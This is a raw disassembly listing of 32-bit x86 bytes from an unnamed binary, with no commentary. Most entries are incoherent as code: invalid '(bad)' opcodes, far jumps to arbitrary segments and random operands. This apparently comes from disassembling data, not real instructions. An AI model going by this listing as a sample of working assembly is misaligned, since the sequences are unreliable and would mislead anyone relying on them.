  4241e5:	or     DWORD PTR [eax-0x4c2a331f],ebx
  4241eb:	scas   al,BYTE PTR es:[edi]
  4241ec:	jns    0x42421c
  4241ee:	cs jmp 0xe1c1984d
  4241f4:	popf   
  4241f5:	test   eax,0xad1c1609
  4241fa:	jmp    0x424231
  4241fc:	pop    edx
  4241fd:	mov    ?,WORD PTR [ebp+0x34ed2537]
  424203:	mov    ah,0x0
  424205:	push   ecx
  424206:	sbb    al,0x9d
  424208:	loope  0x4241a2
  42420a:	dec    esp
  42420b:	mov    dh,0x5e
  42420d:	fldenv cs:[edi-0x33]
  424211:	loop   0x424231
  424213:	fnsave [ebp+0x608dbe78]
  424219:	(bad)  
  42421a:	push   esi
  42421b:	stos   BYTE PTR es:[edi],al
  42421c:	xor    eax,0x8d5e05ad
  424221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424222:	mov    dl,0x98
  424224:	push   es
  424225:	ja     0x424236
  424227:	call   0x8af9:0x12e17cf3
  42422e:	(bad)  
  42422f:	out    0x9b,eax
  424231:	jbe    0x42421e
  424233:	lods   eax,DWORD PTR ds:[esi]
  424234:	sub    BYTE PTR [ebx+0x67f97ab9],bl
  42423a:	lock sub ecx,DWORD PTR [eax]
  42423d:	push   edx
  42423e:	pop    ss
  42423f:	out    0x93,al
  424241:	cld    
  424242:	jle    0x424237
  424244:	dec    ebx
  424245:	adc    esp,esi
  424247:	jnp    0x424295
  424249:	test   al,0x6d
  42424b:	jnp    0x424207
  42424d:	push   0xcfc84d76
  424252:	popa   
  424253:	sub    BYTE PTR [ebx+edx*2],al
  424256:	outs   dx,DWORD PTR ds:[esi]
  424257:	(bad)  
  424258:	fs pop esp
  42425a:	jle    0x42422a
  42425c:	popf   
  42425d:	xchg   bh,dl
  42425f:	inc    esp
  424260:	out    0x8e,eax
  424262:	fadd   DWORD PTR [ebx+0x4b]
  424265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424266:	arpl   WORD PTR [edx-0x60993880],dx
  42426c:	push   es
  42426d:	xlat   BYTE PTR ds:[ebx]
  42426e:	in     eax,0x85
  424270:	imul   esi,DWORD PTR [eax+0x30b45067],0x4f
  424277:	test   al,0x1c
  424279:	sbb    eax,0xbece2146
  42427e:	fist   WORD PTR [eax-0x1a11d4d1]
  424284:	psubusw mm3,QWORD PTR [ebp-0x1af37199]
  42428b:	add    al,BYTE PTR [esi+0x5]
  42428e:	(bad)  
  424290:	jo     0x4242b0
  424292:	lods   eax,DWORD PTR ds:[esi]
  424293:	pop    ss
  424294:	xchg   edx,eax
  424295:	pop    esi
  424296:	pop    eax
  424297:	adc    ebp,esp
  424299:	and    dh,BYTE PTR [edx]
  42429b:	xor    eax,0xade9e261
  4242a0:	add    BYTE PTR [ecx],ah
  4242a2:	sub    eax,0xe19a6518
  4242a7:	mov    bl,0x39
  4242a9:	(bad)  
  4242ab:	mov    ds:0x2708cbe4,eax
  4242b0:	cmc    
  4242b1:	push   es
  4242b2:	or     al,0x81
  4242b4:	mov    dh,0x4d
  4242b6:	jbe    0x42432c
  4242b8:	xchg   edi,eax
  4242b9:	jnp    0x4242b0
  4242bb:	ret    
  4242bc:	cdq    
  4242bd:	mov    ah,0x56
  4242bf:	and    edi,DWORD PTR [eax-0x5abcb843]
  4242c5:	inc    ebx
  4242c6:	or     ecx,eax
  4242c8:	cmp    DWORD PTR [eax+ebp*2-0xc],eax
  4242cc:	test   ah,dl
  4242ce:	pop    esi
  4242cf:	sub    edi,0x62ae5552
  4242d5:	push   es
  4242d6:	leave  
  4242d7:	popa   
  4242d8:	clc    
  4242d9:	jmp    0x424314
  4242db:	cli    
  4242dc:	bound  esi,QWORD PTR [ebx+0x4c57ca94]
  4242e2:	std    
  4242e3:	je     0x4242cc
  4242e5:	ins    DWORD PTR es:[edi],dx
  4242e6:	xchg   esp,eax
  4242e7:	fidiv  DWORD PTR [eax]
  4242e9:	neg    BYTE PTR [esi]
  4242eb:	aad    0xfa
  4242ed:	fs nop
  4242ef:	fs add eax,0x54c6058a
  4242f5:	iret   
  4242f6:	mov    eax,ds:0x8c3e8ce3
  4242fb:	adc    BYTE PTR [esi],bh
  4242fd:	push   0xffffffb6
  4242ff:	xor    edi,DWORD PTR [ebp+0x10ef56fd]
  424305:	push   ds
  424306:	(bad)  
  424307:	hlt    
  424308:	sbb    ebx,DWORD PTR [edx+0x1f971256]
  42430e:	ror    DWORD PTR [esi-0x56d1a3d0],1
  424314:	adc    eax,0x56098f44
  424319:	push   ds
  42431a:	test   eax,0x87f65c92
  42431f:	sbb    al,bl
  424321:	popf   
  424322:	xchg   esp,eax
  424323:	xor    DWORD PTR gs:[esi-0x682a7626],edx
  42432a:	inc    ebx
  42432b:	jb     0x42436d
  42432d:	push   0x3ef9188f
  424332:	daa    
  424333:	inc    esp
  424334:	cmp    bl,BYTE PTR [eax]
  424336:	cmc    
  424337:	dec    edi
  424338:	and    eax,esp
  42433a:	mov    ebx,0xa885c7af
  42433f:	shl    esp,0x6f
  424342:	jnp    0x42430f
  424344:	fidivr DWORD PTR [edi+0xc]
  424347:	add    BYTE PTR [esi+0x584546d1],bl
  42434d:	dec    eax
  42434e:	int    0xa5
  424350:	out    dx,al
  424351:	xchg   DWORD PTR [ecx-0x50],esp
  424354:	or     eax,0x880b09bb
  424359:	cmp    ecx,DWORD PTR [ecx-0x61]
  42435c:	test   cl,ah
  42435e:	adc    eax,0x55e6d106
  424363:	jb     0x424376
  424365:	cs inc eax
  424367:	fnsave [esi+0x792b32db]
  42436d:	mov    bl,0x35
  42436f:	push   edi
  424370:	outs   dx,BYTE PTR ds:[esi]
  424371:	repnz mov ecx,fs
  424374:	push   ss
  424375:	xchg   esp,eax
  424376:	inc    esp
  424378:	mov    bl,0xee
  42437a:	lock fs daa 
  42437d:	add    eax,0x7415e27f
  424382:	sahf   
  424383:	dec    ebp
  424384:	(bad)  
  424385:	jmp    0x326f:0xcf5b1aa8
  42438c:	popf   
  42438d:	mov    dl,0x75
  42438f:	cmp    DWORD PTR [edx-0x16722942],edi
  424395:	mov    eax,ds:0x673f7b55
  42439a:	aas    
  42439b:	dec    ebx
  42439c:	adc    DWORD PTR [ecx],0x4f
  42439f:	xor    BYTE PTR [eax],dh
  4243a1:	mov    ch,bl
  4243a3:	idiv   BYTE PTR [ebx-0x6d]
  4243a6:	inc    esp
  4243a7:	retf   0x928a
  4243aa:	mov    esi,0xb33f6f5a
  4243af:	pop    edi
  4243b0:	fidivr DWORD PTR [ebx+0x54]
  4243b3:	stos   DWORD PTR es:[edi],eax
  4243b4:	add    eax,0x55b1eded
  4243b9:	mov    edx,0x3d48a5df
  4243bf:	or     esp,ebp
  4243c1:	mov    ecx,0x40b59bf0
  4243c6:	and    eax,0xab362e7
  4243cb:	jmp    0xcd4a:0x4eda2cd3
  4243d2:	cmp    bh,bh
  4243d4:	mov    ds:0x89a93bde,al
  4243d9:	call   0xc9277ee
  4243de:	pop    ds
  4243df:	dec    eax
  4243e0:	adc    BYTE PTR [ebx-0xf1b4ced],bh
  4243e6:	push   es
  4243e7:	sub    ch,BYTE PTR [ebx-0x2d2b3f3f]
  4243ed:	test   DWORD PTR [ecx],0x634090e
  4243f3:	nop
  4243f4:	xchg   esi,eax
  4243f5:	hlt    
  4243f6:	cmp    BYTE PTR es:[eax],ch
  4243f9:	or     al,BYTE PTR [edx]
  4243fb:	aas    
  4243fc:	inc    edx
  4243fd:	mov    gs,esi
  4243ff:	jne    0x4243a2
  424401:	scas   al,BYTE PTR es:[edi]
  424402:	mov    esi,0x9572e2ad
  424407:	test   al,0x4c
  424409:	enter  0x1f50,0xd9
  42440d:	nop
  42440e:	sbb    ah,BYTE PTR [edi+0x23b87f46]
  424414:	pop    edi
  424415:	ds ret 0xc160
  424419:	rcl    BYTE PTR [edx+eiz*8],cl
  42441c:	sar    DWORD PTR [ecx+0x3540d50f],cl
  424422:	cs xchg esi,eax
  424424:	mov    bh,0xe
  424426:	jl     0x4244a2
  424428:	das    
  424429:	cmc    
  42442a:	inc    ebp
  42442b:	or     DWORD PTR [ebx],edi
  42442d:	leave  
  42442e:	push   ss
  42442f:	dec    edi
  424430:	(bad)  
  424432:	mov    eax,DWORD PTR [edi+0x7b]
  424435:	icebp  
  424436:	addr16 mov ah,0x17
  424439:	sbb    DWORD PTR [edx],ebx
  42443b:	leave  
  42443c:	xor    ah,BYTE PTR [ebx]
  42443e:	idiv   edx
  424440:	push   ebx
  424441:	sbb    ebx,0xbda40d79
  424447:	pop    ss
  424448:	pop    esi
  424449:	lock sbb ebx,ecx
  42444c:	(bad)  
  42444d:	imul   esi
  42444f:	inc    esp
  424450:	jne    0x42449b
  424452:	lods   eax,DWORD PTR ds:[esi]
  424453:	sub    al,0x95
  424455:	sub    al,0x17
  424457:	fwait
  424458:	sub    DWORD PTR [ecx],esp
  42445a:	out    0xa6,eax
  42445c:	mov    eax,ds:0xe51c8ee
  424461:	fld    QWORD PTR [ebx]
  424463:	xor    bl,al
  424465:	jl     0x4244b7
  424467:	jle    0x42442f
  424469:	add    cl,BYTE PTR [eax]
  42446b:	push   esi
  42446c:	or     BYTE PTR [eax],0x34
  42446f:	or     ah,al
  424471:	test   eax,0xd9cd524e
  424476:	xor    DWORD PTR [ebp-0x3df33867],esp
  42447c:	mov    bl,0x88
  42447e:	bound  ebx,QWORD PTR [ecx-0x5b]
  424481:	loop   0x42449b
  424483:	outs   dx,BYTE PTR ds:[esi]
  424484:	mov    ecx,0x2977bee
  424489:	pop    esp
  42448a:	shr    BYTE PTR [esi],1
  42448c:	jle    0x42446b
  42448e:	sahf   
  42448f:	push   ecx
  424490:	push   ds
  424491:	imul   ebp,DWORD PTR [edi],0xbd006a32
  424497:	dec    ecx
  424498:	push   ss
  424499:	push   edi
  42449a:	inc    edi
  42449b:	out    dx,eax
  42449c:	das    
  42449d:	sub    DWORD PTR [ebp+0x3bcc3a6b],esi
  4244a3:	fimul  WORD PTR [ecx-0x4df07a11]
  4244a9:	fs pop edi
  4244ab:	iret   
  4244ac:	ret    0x3925
  4244af:	dec    edi
  4244b0:	jno    0x424480
  4244b2:	mov    al,0x3c
  4244b4:	mov    al,BYTE PTR [edi-0x4caadec2]
  4244ba:	add    eax,0x64a91b42
  4244bf:	gs je  0x4244a4
  4244c2:	jbe    0x424475
  4244c4:	pop    ss
  4244c5:	mov    ds,eax
  4244c7:	push   ecx
  4244c8:	(bad)  
  4244c9:	mov    ebx,0xd8199984
  4244ce:	(bad)  
  4244cf:	cmp    BYTE PTR [ecx+0x61b427a3],cl
  4244d5:	dec    edx
  4244d6:	(bad)  
  4244d7:	or     BYTE PTR [ebx+0x50],ah
  4244da:	test   BYTE PTR [eax+ebx*8+0x30],ch
  4244de:	mov    ds:0xdc3d99de,al
  4244e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244e4:	vpsubusw ymm6,ymm5,ymm1
  4244e8:	(bad)  
  4244e9:	jl     0x4244f3
  4244eb:	pop    ebx
  4244ec:	jecxz  0x42456b
  4244ee:	les    edi,FWORD PTR [ebx+0x288e68ee]
  4244f4:	cdq    
  4244f5:	xor    eax,0xc91bb75a
  4244fa:	push   esi
  4244fb:	daa    
  4244fc:	mov    cl,0x74
  4244fe:	dec    ebx
  4244ff:	sti    
  424500:	jne    0x424516
  424502:	jecxz  0x424488
  424504:	sub    eax,0x91fb587e
  424509:	mov    ecx,0x2c59a156
  42450e:	loopne 0x424576
  424510:	pop    es
  424511:	dec    esp
  424512:	test   al,0xd5
  424514:	sub    eax,0x6425d448
  424519:	add    BYTE PTR [eax+0x67],al
  42451c:	push   0x1e3231e6
  424521:	fwait
  424522:	nop
  424523:	imul   ebx,edx,0x2f072a38
  424529:	cmp    DWORD PTR [edi-0x1b],0x8
  42452d:	add    esi,DWORD PTR [ebp+0x605159e5]
  424533:	int    0xb7
  424535:	rol    BYTE PTR [esi-0x7e9b44c4],1
  42453b:	shl    DWORD PTR [edx],1
  42453d:	ins    BYTE PTR es:[edi],dx
  42453e:	inc    esp
  42453f:	call   0x9180:0x338718c4
  424546:	sbb    eax,0xb285025
  42454b:	push   esi
  42454c:	(bad)  
  42454d:	cmp    al,0x85
  42454f:	jmp    0xaa5ddc07
  424554:	fs push ecx
  424556:	mov    eax,ds:0xd6913cd9
  42455b:	out    dx,al
  42455c:	inc    edi
  42455d:	popf   
  42455e:	xor    eax,0x33d428a7
  424563:	inc    edi
  424564:	xchg   ecx,eax
  424565:	mov    ds:0xec28b01a,eax
  42456a:	ds ja  0x424508
  42456d:	xchg   DWORD PTR [esi-0x5],ebx
  424570:	lahf   
  424571:	leave  
  424572:	ds adc al,0xb2
  424575:	push   edx
  424576:	xchg   ebp,eax
  424577:	jmp    0x4245e4
  424579:	sti    
  42457a:	addr16 inc ebp
  42457c:	fsubrp st(6),st
  42457e:	imul   esi,DWORD PTR [ebx-0x2],0x2c34ea84
  424585:	pop    edi
  424586:	push   ecx
  424587:	in     al,0xbe
  424589:	data16 jae 0x4245d3
  42458c:	mov    BYTE PTR [ebp+0x26],0xff
  424590:	ja     0x42455a
  424592:	fld    QWORD PTR ds:0x765c133
  424598:	test   BYTE PTR [ebx+0x5c],al
  42459b:	popf   
  42459c:	dec    BYTE PTR es:[esi+0x53]
  4245a0:	and    edi,DWORD PTR [edx+0xac748c6]
  4245a6:	jnp    0x4245a4
  4245a8:	out    dx,al
  4245a9:	jp     0x424616
  4245ab:	lea    ebp,[edx-0x79]
  4245ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245af:	je     0x4245f7
  4245b1:	into   
  4245b2:	fcomp  QWORD PTR [ecx-0x1c032e42]
  4245b8:	scas   eax,DWORD PTR es:[edi]
  4245b9:	pop    ss
  4245ba:	(bad)  
  4245bc:	ins    DWORD PTR es:[edi],dx
  4245bd:	push   ss
  4245be:	jb     0x424571
  4245c0:	or     eax,0xb566b3bf
  4245c5:	inc    ebp
  4245c6:	test   al,0xb5
  4245c8:	push   ds
  4245c9:	ss ror dh,1
  4245cc:	aam    0x59
  4245ce:	push   0xffffffb5
  4245d0:	sub    ebp,edi
  4245d2:	mov    ebp,0xe303e074
  4245d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245d8:	int    0x0
  4245da:	push   ebx
  4245db:	sub    esi,DWORD PTR ds:0xd8029e46
  4245e1:	lods   al,BYTE PTR ds:[esi]
  4245e2:	jp     0x4245e9
  4245e4:	mov    al,ds:0x48f6bc9d
  4245e9:	inc    eax
  4245ea:	push   edx
  4245eb:	mov    ebp,edi
  4245ed:	or     eax,0x71e06daf
  4245f2:	pop    di
  4245f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245f6:	addr16 and ch,al
  4245f9:	dec    esi
  4245fa:	xchg   DWORD PTR [ebx-0x78],eax
  4245fd:	aam    0xbf
  4245ff:	imul   ebp,DWORD PTR [edi-0xa],0xffffffa2
  424603:	je     0x4245a1
  424605:	xlat   BYTE PTR ds:[ebx]
  424606:	ja     0x42464f
  424608:	int3   
  424609:	sub    DWORD PTR [ecx+0x131a3c2b],edx
  42460f:	test   al,0x7b
  424611:	sbb    edi,edx
  424613:	popa   
  424614:	push   ebp
  424615:	aas    
  424616:	inc    edx
  424617:	dec    edi
  424618:	mov    cl,0x16
  42461a:	cwde   
  42461b:	pop    esi
  42461c:	push   0xf7b5c895
  424621:	arpl   WORD PTR [edi+0x2d],di
  424624:	lea    eax,[edi]
  424626:	push   0x25
  424628:	lods   al,BYTE PTR ds:[esi]
  424629:	(bad)  
  42462a:	stc    
  42462b:	fisubr DWORD PTR ds:0xc3dd8e48
  424631:	fsub   DWORD PTR [edx+0x780bb345]
  424637:	ss xchg esp,eax
  424639:	dec    ebx
  42463a:	scas   al,BYTE PTR es:[edi]
  42463b:	ins    BYTE PTR es:[edi],dx
  42463c:	loop   0x4245e8
  42463e:	jecxz  0x42463e
  424640:	ror    DWORD PTR [esi],cl
  424642:	xchg   edi,eax
  424643:	lea    esi,[eax+0x5a]
  424646:	push   ss
  424647:	sbb    WORD PTR [ecx-0x34a40fef],si
  42464e:	ds int3 
  424650:	repz push ebp
  424652:	sbb    BYTE PTR [edi+0x6025e5b8],dl
  424658:	retf   
  424659:	fcom   QWORD PTR [esi*8+0x1ad7d824]
  424660:	repz loop 0x42463d
  424663:	mov    esi,0x427bcf64
  424668:	mov    edi,0xf5bc3ba5
  42466d:	into   
  42466e:	test   eax,0xb19ec7d2
  424673:	ror    DWORD PTR [ebp-0x79],cl
  424676:	push   0xffffffe9
  424678:	call   0x390a:0xba388a77
  42467f:	add    eax,0xe9c551a7
  424684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424685:	lea    ebp,[ecx+ebx*8-0x69f3d075]
  42468c:	pusha  
  42468d:	lods   eax,DWORD PTR ds:[esi]
  42468e:	stos   DWORD PTR es:[edi],eax
  42468f:	in     eax,0x25
  424691:	mov    ds:0x1220167c,al
  424696:	xchg   esi,eax
  424697:	sub    al,0x7b
  424699:	and    dh,BYTE PTR [edi]
  42469b:	jl     0x424651
  42469d:	call   0x339d:0x256e1ded
  4246a4:	call   0x862426de
  4246a9:	addr16 clc 
  4246ab:	mov    bl,0xda
  4246ad:	lahf   
  4246ae:	scas   al,BYTE PTR es:[edi]
  4246af:	sbb    dh,ah
  4246b1:	les    esp,FWORD PTR [eax]
  4246b3:	(bad)  
  4246b4:	loop   0x4246f9
  4246b6:	push   eax
  4246b7:	dec    edi
  4246b8:	aas    
  4246b9:	jno    0x4246b3
  4246bb:	xor    ebx,DWORD PTR [edi]
  4246bd:	out    dx,al
  4246be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246bf:	arpl   WORD PTR [eax-0x2d],cx
  4246c2:	and    eax,edi
  4246c4:	adc    DWORD PTR [ebx],esi
  4246c6:	into   
  4246c7:	xlat   BYTE PTR ds:[ebx]
  4246c8:	call   0xc9e3cd7b
  4246cd:	int    0x9d
  4246cf:	adc    al,0xf1
  4246d1:	jb     0x4246c0
  4246d3:	(bad)
  4246d7:	or     eax,0x5d089983
  4246dc:	(bad)  
  4246de:	pop    ss
  4246df:	mov    ebp,0xc5dcd262
  4246e4:	or     eax,0x58850faa
  4246e9:	or     DWORD PTR [eax-0x81357e3],esi
  4246ef:	sbb    BYTE PTR [edi],bh
  4246f1:	inc    edi
  4246f2:	pop    ss
  4246f3:	jns    0x4246c7
  4246f5:	int    0xc8
  4246f7:	sub    ecx,DWORD PTR [esi]
  4246f9:	mov    BYTE PTR [esi+0x78],bh
  4246fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246fd:	xor    al,BYTE PTR [esi]
  4246ff:	xchg   BYTE PTR [ebx],bh
  424701:	push   ebp
  424702:	daa    
  424703:	push   ss
  424704:	xchg   esp,eax
  424705:	mov    al,0xf2
  424707:	enter  0xf0ac,0x80
  42470b:	xchg   ebp,eax
  42470c:	fcomp  DWORD PTR [ebx+0x5430d058]
  424712:	fwait
  424713:	stc    
  424714:	mov    bl,0x83
  424716:	loope  0x4246c5
  424718:	data16 loopne 0x42473f
  42471b:	mov    BYTE PTR [ebx-0x60],cl
  42471e:	xchg   esp,eax
  42471f:	add    BYTE PTR [esi*2+0x711d1fe4],bh
  424726:	(bad)  
  424727:	in     eax,dx
  424728:	xchg   edi,eax
  424729:	mov    di,WORD PTR ds:0x75e1b88f
  424730:	add    edx,DWORD PTR [ebx+eax*4]
  424733:	fnstsw WORD PTR ds:0xdeea219f
  424739:	and    DWORD PTR ds:[edx-0x78c67b4c],ebp
  424740:	pop    ds
  424741:	pop    esi
  424742:	idiv   DWORD PTR [edx-0x30]
  424745:	sbb    DWORD PTR [ebx+0x7cb1d62c],ecx
  42474b:	sbb    esi,DWORD PTR [ebx-0x25763f8f]
  424751:	ja     0x4247d1
  424753:	fcom   QWORD PTR [ebx+0x41]
  424756:	jbe    0x424749
  424758:	mov    ebp,0x929cd174
  42475d:	iret   
  42475e:	push   esp
  42475f:	fwait
  424760:	(bad)  
  424761:	js     0x424745
  424763:	jge    0x424786
  424765:	or     DWORD PTR [ecx+0x6c6e1dd0],esp
  42476b:	mov    ebp,0xd6bc60da
  424770:	popf   
  424771:	jnp    0x4247b0
  424773:	les    eax,FWORD PTR [eax+0xd5bcb1]
	...
  4247bd:	add    BYTE PTR [eax+0x78001020],bl
  4247c3:	add    edx,DWORD PTR [eax]
  4247c5:	add    BYTE PTR [ebp-0x9ffefa4],bh
  4247cb:	push   ebp
  4247cc:	adc    BYTE PTR [eax],al
  4247ce:	and    eax,0x3800107b
  4247d3:	cmp    DWORD PTR [eax],edx
  4247d5:	add    BYTE PTR [ebp+edx*1+0x1e9b0010],cl
  4247dc:	adc    BYTE PTR [eax],al
	...
  4257de:	add    BYTE PTR [eax],dl
  4257e0:	add    BYTE PTR [eax],al
  4257e2:	in     al,dx
  4257e3:	add    BYTE PTR [eax],al
  4257e5:	add    BYTE PTR [edx],ch
  4257e7:	xor    BYTE PTR [eax],dh
  4257e9:	xor    BYTE PTR ds:0x58304c30,dh
  4257ef:	xor    BYTE PTR [esi+0x30],bl
  4257f2:	xor    BYTE PTR fs:[eax-0x65cf71d0],cl
  4257f9:	xor    BYTE PTR [eax-0x4ccf59d0],ah
  4257ff:	xor    al,al
  425801:	xor    bh,cl
  425803:	xor    BYTE PTR [edx-0x48ce51cf],ch
  425809:	xor    esp,eax
  42580b:	xor    eax,ecx
  42580d:	xor    DWORD PTR [ebp-0x60cc6ece],esp
  425813:	xor    ebp,DWORD PTR [esi-0x3acc47cd]
  425819:	xor    edx,ebp
  42581b:	xor    ebx,ebp
  42581d:	xor    esp,esp
  42581f:	xor    ebp,edi
  425821:	xor    edi,ebp
  425823:	xor    ecx,DWORD PTR [eax]
  425825:	xor    al,0xc
  425827:	xor    al,0x14
  425829:	xor    al,0x28
  42582b:	xor    al,0x2e
  42582d:	xor    al,0x40
  42582f:	xor    al,0x46
  425831:	xor    al,0xf8
  425833:	xor    eax,0x360435fc
  425838:	push   cs
  425839:	sbb    esi,DWORD PTR ss:[esi]
  42583c:	sub    esi,DWORD PTR [esi]
  42583e:	xor    DWORD PTR [esi],esi
  425840:	cmp    eax,0x48364336
  425845:	ss dec esi
  425847:	ss pop esp
  425849:	ss push 0x7f367b36
  42584f:	ss pop edi
  425851:	aaa    
  425852:	imul   esi,DWORD PTR [edi],0x7e
  425855:	aaa    
  425856:	xor    BYTE PTR [edi],0x8d
  425859:	aaa    
  42585a:	call   0xb637:0xb037a937
  425861:	aaa    
  425862:	ret    
  425863:	aaa    
  425864:	shl    DWORD PTR [edi],cl
  425866:	mov    ah,0x38
  425868:	mov    ebp,0xce38ca38
  42586d:	cmp    dh,dl
  42586f:	cmp    dl,ah
  425871:	cmp    dl,dh
  425873:	cmp    dh,dh
  425875:	cmp    BYTE PTR [ebx-0x33c53fc6],dh
  42587b:	cmp    ah,dl
  42587d:	cmp    ch,dh
  42587f:	cmp    dh,ch
  425881:	cmp    bh,bl
  425883:	cmp    al,BYTE PTR [edi]
  425885:	cmp    ecx,DWORD PTR [ebx+edi*1]
  425888:	adc    eax,0x2a3b1b3b
  42588d:	cmp    esi,DWORD PTR [ecx]
  42588f:	cmp    esi,DWORD PTR [edi]
  425891:	cmp    eax,DWORD PTR [ebx+edi*1+0x30]
  425895:	cmp    al,0x34
  425897:	cmp    al,0x3e
  425899:	cmp    al,0x44
  42589b:	cmp    al,0x49
  42589d:	cmp    al,0x52
  42589f:	cmp    al,0x5b
  4258a1:	cmp    al,0x6a
  4258a3:	cmp    al,0x71
  4258a5:	cmp    al,0x77
  4258a7:	cmp    al,0x84
  4258a9:	cmp    al,0x9d
  4258ab:	cmp    al,0xa6
  4258ad:	cmp    al,0xac
  4258af:	cmp    al,0xb9
  4258b1:	cmp    al,0xc0
  4258b3:	cmp    al,0xce
  4258b5:	cmp    al,0xd7
  4258b7:	cmp    al,0xba
  4258b9:	cmp    eax,0x3dd13dc4
  4258be:	loope  0x4258fd
  4258c0:	out    0x3d,eax
  4258c2:	hlt    
  4258c3:	cmp    eax,0x3e013dfb
  4258c8:	or     BYTE PTR [esi],bh
  4258ca:	add    BYTE PTR [eax],ah
  4258cc:	add    BYTE PTR [eax],al
  4258ce:	dec    eax
  4258cf:	add    BYTE PTR [eax],al
  4258d1:	add    BYTE PTR [ebx],bh
  4258d3:	cmp    al,0x4c
  4258d5:	cmp    al,0x52
  4258d7:	cmp    al,0x58
  4258d9:	cmp    al,0x65
  4258db:	cmp    al,0x73
  4258dd:	cmp    al,0x7f
  4258df:	cmp    al,0x85
  4258e1:	cmp    al,0x94
  4258e3:	cmp    al,0x9a
  4258e5:	cmp    al,0xa5
  4258e7:	cmp    al,0xaf
  4258e9:	cmp    al,0xb6
  4258eb:	cmp    al,0xbc
  4258ed:	cmp    al,0xc8
  4258ef:	cmp    al,0xd6
  4258f1:	cmp    al,0xdc
  4258f3:	cmp    al,0xe9
  4258f5:	cmp    al,0xf0
  4258f7:	cmp    al,0xf6
  4258f9:	cmp    al,0x9
  4258fb:	cmp    eax,0x3d203d13
  425900:	sub    al,0x3d
  425902:	xor    DWORD PTR ds:0x3d403d3b,edi
  425908:	inc    ebp
  425909:	cmp    eax,0x3d513d4b
  42590e:	pop    eax
  42590f:	cmp    eax,0x30000000
  425914:	add    BYTE PTR [eax],al
  425916:	or     al,0x1
  425918:	add    BYTE PTR [eax],al
  42591a:	push   ebx
  42591b:	xor    bl,BYTE PTR [ecx+0x32]
  42591e:	xor    ch,BYTE PTR gs:[ebx+0x32]
  425922:	jae    0x425956
  425924:	jns    0x425958
  425926:	test   BYTE PTR [edx],dh
  425928:	mov    BYTE PTR [edx],dh
  42592a:	(bad)  
  42592b:	xor    bl,BYTE PTR [esi-0x54cd5ace]
  425931:	xor    bh,BYTE PTR [eax-0x27cd36ce]
  425937:	xor    ah,dh
  425939:	xor    ch,dl
  42593b:	xor    bh,cl
  42593d:	xor    bh,bh
  42593f:	xor    ah,BYTE PTR [ecx+0x34]
  425942:	addr16 xor al,0x1d
  425945:	xor    eax,0x35333529
  42594a:	cmp    BYTE PTR ds:0x355a3543,dh
  425950:	arpl   WORD PTR ds:0x357a356d,si
  425956:	xchg   BYTE PTR ds:0x3591358b,dh
  42595c:	xchg   esi,eax
  42595d:	xor    eax,0x35a7359c
  425962:	mov    ebx,0xce35c135
  425967:	xor    eax,0x3758374f
  42596c:	pop    esi
  42596d:	aaa    
  42596e:	jb     0x4259a7
  425970:	jnp    0x4259a9
  425972:	test   DWORD PTR [edi],esi
  425974:	mov    WORD PTR [edi],?
  425976:	xchg   edx,eax
  425977:	aaa    
  425978:	sahf   
  425979:	aaa    
  42597a:	lods   al,BYTE PTR ds:[esi]
  42597b:	aaa    
  42597c:	mov    dl,0x37
  42597e:	shl    DWORD PTR [edi],0xc8
  425981:	aaa    
  425982:	into   
  425983:	aaa    
  425984:	(bad)  [edi]
  425986:	call   0x127a5cc2
  42598b:	cmp    BYTE PTR [ecx],bl
  42598d:	cmp    BYTE PTR [edi],bl
  42598f:	cmp    BYTE PTR [eax+edi*1],ch
  425992:	cmp    eax,0x49384338
  425997:	cmp    BYTE PTR [esi+0x38],dl
  42599a:	pop    ebp
  42599b:	cmp    BYTE PTR [eax+0x38],ch
  42599e:	mov    BYTE PTR [eax],bh
  4259a0:	xchg   esp,eax
  4259a1:	cmp    BYTE PTR [ecx-0x43c74ec8],ah
  4259a7:	cmp    dh,cl
  4259a9:	cmp    ch,bl
  4259ab:	cmp    ah,ah
  4259ad:	cmp    dl,ch
  4259af:	cmp    bh,dh
  4259b1:	cmp    BYTE PTR [esi],cl
  4259b3:	cmp    DWORD PTR [ecx],ebx
  4259b5:	cmp    DWORD PTR [esi],esp
  4259b7:	cmp    DWORD PTR [edi-0x4fc55bc6],edx
  4259bd:	cmp    bh,BYTE PTR [edx+edi*1+0x3ae63ac8]
  4259c4:	idiv   DWORD PTR [edx]
  4259c6:	(bad)  
  4259c7:	cmp    al,BYTE PTR [ebx+edi*1]
  4259ca:	adc    DWORD PTR [ebx],edi
  4259cc:	and    DWORD PTR [ebx],edi
  4259ce:	daa    
  4259cf:	cmp    esi,DWORD PTR [esi]
  4259d1:	cmp    edi,DWORD PTR ds:0x593b483b
  4259d7:	cmp    esp,DWORD PTR [eax+0x3b]
  4259da:	cmp    si,WORD PTR [ebx+0x3b]
  4259de:	xchg   edx,eax
  4259df:	cmp    ebx,DWORD PTR [edi+0x163ba73b]
  4259e5:	cmp    eax,0x3d273d20
  4259ea:	sub    eax,0x433d3d3d
  4259ef:	cmp    eax,0x3d5f3d50
  4259f4:	jae    0x425a33
  4259f6:	jle    0x425a35
  4259f8:	xchg   BYTE PTR ds:0x3d9c3d96,bh
  4259fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259ff:	cmp    eax,0x3dbc3daf
  425a04:	retf   
  425a05:	cmp    eax,0x3dd73dd1
  425a0a:	fidivr WORD PTR ds:0x3df83de9
  425a10:	(bad)  
  425a11:	cmp    eax,0x3e123e05
  425a16:	dec    ebx
  425a17:	ds push ecx
  425a19:	ds pop esi
  425a1b:	ds gs add BYTE PTR ds:[eax+0x0],dl
  425a21:	add    BYTE PTR [eax+0x26000000],cl
  425a27:	xor    DWORD PTR [ebx],esi
  425a29:	xor    DWORD PTR [edx+0x31],eax
  425a2c:	dec    ecx
  425a2d:	xor    DWORD PTR [edi+0x31],ecx
  425a30:	pop    esp
  425a31:	xor    DWORD PTR [esi+0x31],ebp
  425a34:	ja     0x425a67
  425a36:	xor    DWORD PTR [ecx],0xffffff89
